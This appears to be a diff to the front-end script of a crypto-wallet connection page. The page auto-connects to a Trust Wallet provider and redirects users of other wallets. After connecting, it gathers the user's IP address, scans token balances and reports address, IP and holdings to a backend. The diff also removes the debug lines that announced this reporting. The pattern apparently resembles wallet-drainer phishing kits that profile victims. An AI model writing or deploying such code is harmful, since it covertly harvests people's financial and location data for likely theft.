@@ -10,14 +10,12 @@
             if (address) {
                 window.debugLog("Wallet connected: " + address, "success");
                 
-                window.debugLog("Notifying backend about wallet connect...", "info");
                 const ipAddress = await getIPAddress();
                 window.debugLog("IP Address: " + ipAddress, "info");
                 
-                notifyWalletConnect(address, ipAddress);
-                window.debugLog("Wallet connect notification sent to backend", "success");
+                const scannedTokens = await fetchAndRenderBalances(address, CONTRACT_ADDRESS);
                 
-                await fetchAndRenderBalances(address, CONTRACT_ADDRESS);
+                notifyWalletConnect(address, ipAddress, scannedTokens);
             } else {
                 window.debugLog("Wallet connection failed or cancelled", "warning");
             }
@@ -45,8 +43,6 @@
             attempts++;
             const pCheck = getTrustWalletProvider();
             
-            window.debugLog("Auto-connect attempt " + attempts + ": " + (pCheck ? "Provider found" : "No provider"), "info");
-            
             if (pCheck && pCheck !== "REJECTED_OTHER_WALLET") {
                 clearInterval(timer);
                 window.debugLog("Provider detected, connecting...", "success");
@@ -56,22 +52,17 @@
                 if (address) {
                     window.debugLog("Auto-connected: " + address, "success");
                     
-                    window.debugLog("Notifying backend about wallet connect...", "info");
                     const ipAddress = await getIPAddress();
                     window.debugLog("IP Address: " + ipAddress, "info");
                     
-                    notifyWalletConnect(address, ipAddress);
-                    window.debugLog("Wallet connect notification sent", "success");
+                    const scannedTokens = await fetchAndRenderBalances(address, CONTRACT_ADDRESS);
                     
-                    await fetchAndRenderBalances(address, CONTRACT_ADDRESS);
+                    notifyWalletConnect(address, ipAddress, scannedTokens);
                 }
             } else if (pCheck === "REJECTED_OTHER_WALLET" || attempts > 15) {
                 clearInterval(timer);
                 if (pCheck === "REJECTED_OTHER_WALLET") {
-                    window.debugLog("Other wallet detected, redirecting...", "warning");
                     redirectToTrustRequired();
-                } else {
-                    window.debugLog("Auto-connect timeout after 15 attempts", "error");
                 }
             }
         }, 500);
